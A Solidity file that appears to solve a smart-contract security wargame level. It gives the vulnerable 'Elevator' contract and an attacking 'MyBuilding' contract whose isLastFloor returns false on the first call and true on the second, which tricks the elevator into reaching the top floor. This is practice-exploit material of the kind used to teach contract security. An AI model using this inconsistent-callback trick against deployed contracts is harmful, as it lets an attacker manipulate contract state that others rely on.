// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract MyBuilding is Building{
       
       mapping(address=>mapping(uint=>bool)) public elevator;

    
      function  isLastFloor(uint _floor)  external override returns (bool){
          bool  gone=elevator[msg.sender][_floor];
          elevator[msg.sender][_floor]=!gone;
    
          return gone;
      }

      function goTo(address _elevator,uint _floor) public{
          Elevator(_elevator).goTo(_floor);
      }



}